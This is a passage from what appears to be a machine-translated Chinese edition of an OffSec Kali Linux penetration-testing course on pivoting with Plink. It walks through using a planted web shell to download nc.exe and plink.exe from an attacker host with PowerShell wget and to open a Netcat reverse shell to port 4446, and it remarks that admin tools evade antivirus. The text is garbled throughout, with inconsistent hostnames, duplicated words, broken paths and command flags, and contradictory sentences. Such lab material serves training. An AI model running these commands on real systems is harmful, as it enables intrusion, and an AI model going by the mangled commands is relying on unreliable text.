
|---|---|---|---|---|

| confluence | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | |

| postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | |

| template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres |

| template | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres |

(4 行) | | | | |

```
postgres=#
```

列表 564 - 使用 `psql` 和 `Proxysql` 连接到 PostgreSQL 服务器。

连接成功！我们现在通过在 Windows Server 2022 机器上运行的 OpenSSH 客户端启动的 SSH 端口转发，与 PGDABASE01 PostgreSQL PostgreSQL 交互。

在本节中，我们将通过从 Windows 客户端到 Kali 机器建立的 SSH 端口转发，连接到运行在 Linux 服务器上的 PostgreSQL 数据库。

# 使用 Kali Linux 进行渗透测试

管理员可能会避免在他们的机器上留下 OpenSSH，即使我们发现自己在较版本的 Windows 上，网络管理员也将其删。尽管如此，网络管理员仍然需要管理工具。大多数网络在某些地方运行着 SSH 服务器，管理员需要从 Windows 主机连接到这些服务器。在 OpenSSH 在 Windows 上容易可用之前，大多数网络管理员的首选工具是 `PuTTY` 及其命令行对应版本 `Plink`。

使用网络管理员流行的工具的处之一是，它们很少被传统的杀毒软件标记。这使得它们对攻击者更有吸引力，因为与具有类似功能的安全相关工具相比，使用它们相对隐蔽。我们将在本次安全评估中使用 `Plink`，我们更有可能获得 Shell 访问而不是 GUI 访问。`Plink` 手册说明，OpenSSH 客户端的大部分功能也内置在 `Plink` 中（尽管 `Plink` 缺少的一个显著功能是动态转发）。

Windows 提供了端口转发功能。在这种情况下，我们使用 `Plink` 是因为它常见、轻量，并且专门为在命令行运行而设计。

让我们在一个修改后的场景中使用 `Plink` 来熟悉它。在这一场景中，我们发现 `MULTERVER03` 在 TCP 端口 80 上暴露了一个 Web 应用。所有入站端口都被防火墙拦截，RDP 也不再可用。布局如下图所示：

![](img/33d6ea891e7464f18ad6426619ced4_601_png)

图 254：防火墙后的 `MULTERVER03`，仅暴露了 80 端口

我们可以通过 Web 应用入侵 `MULTERVER03`，在其上投放 Web Shell，并利用它获取反向 Shell。我们之前发现了可以连接 RDP 服务的凭据。这被防火墙拦截了，因此无法直接连接。OpenSSH 客户端也被删除了，所以无法使用 `Plink` 创建远程端口转发。

然而，我们还有另一个选项：我们可以使用 `Plink` 创建远程端口转发。

让我们尝试一下。首先，我们将通过 Web Shell 从 `MULTERVER03` 获取交互式反向 Shell。我们已经在 `/umbraco/forms.aspx` 上传了一个基础 Shell。我们可以访问这个 URL 并运行任何命令 - 这些命令将以 `iis apppool/defaultappool` 用户身份运行。我们可以使用这个 Shell 将 `nc.exe` 下载到 `MULTERVER03`，

`MULTISERVER03` 已经“预编译”在实验环境中。此时，你可以访问 `/umbraco/forms.aspx` 位于 `MULTERVER03` 上 80 端口的 HTTP 服务器。你应该看到一个网页，它可以让你在 `MULTERVER03` 上运行命令。

为了将 `nc.exe` 下载到 `MULTERVER03`，我们需要在 `MULTERVER03` 可以访问的服务器上托管它。我们可以轻松地在 Kali 机器上配置 Apache 来此。Kali 默认安装了 Apache，我们只需要启动 `apache2` 服务。

```
kali@kali:~ sudo systemctl start apache2
[sudo] password for kali:
```

```
kali@kali:-
```

我们可以从 Kali 的 `windows-resources/binaries` 目录找到 `nc.exe` 并将其复制到 Apache 根目录。

```
kali@kali:-$ find -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe
```

```
kali@kali:-$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

一旦设置好，我们应该能够在 `MULTERVER03` 上启用它。我们将使用 Web Shell 中的 PowerShell `wget` 命令来下载 `nc.exe`。

在 Shell 中，我们将使用一条命令指示 PowerShell 从 Kali 机器下载 `nc.exe` 并将其写入 `MULTERVER03` 的 `C:\Windows\Temp` -OutputFile。

```
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

一旦执行了 PowerShell 命令，我们的负载将从 Apache2 服务器下载到 `MULTERVER03` 的 `C:\Windows\nc.exe`。

然后我们在 Kali 机器的 4446 端口设置 Netcat 监听器。

```
kali@kali:$ nc -nvlp 4446
listening on [any] 4446
```

一旦监听器运行，我们将再次使用 Web Shell 在 `MULTERVER03` 上执行 `nc.exe`，使用 `-e` 在连接建立后执行 `cmd`。

```
C:\Windows\Temp\nc.exe - cmd exe 192.168.118.4 4446
```

# 使用 Kali Linux 进行 OffSec 渗透测试

`shell` 快速获取了监听器。

```
listening on [any] 4446 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.64] 51889
Microsoft Windows [Version 10.0.28348.825]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

*列表 570 - Netcat 监听器捕获到的 `nc.exe` 文件。*

我们现在想要将 `Plink` 下载到 `MULTISERVER03`。在我们的 Kali Kali 机器上，我们可以从 `windows-resources/binaries` 复制 `plink.exe` 到 Apache 2 web 根目录

```
kali@kali:~$ find -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
[sudo] password for kali:
```

*列表 571 - 将 `plink.exe` 复制到我们的 Apache 2 web 根目录。*

在反向连接中，我们将使用 PowerShell 将 `plink.exe` 从我们的 Kali 机器下载到 `C:\WindowsTemp`

```
c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
c:\windows\system32\inetsrv>
```

*列表 572 - `Plink` 已下载到 C: 文件夹。*

当可执行文件已下载到 `MULTISERVER03` 后，我们可以考虑使用以下方法：
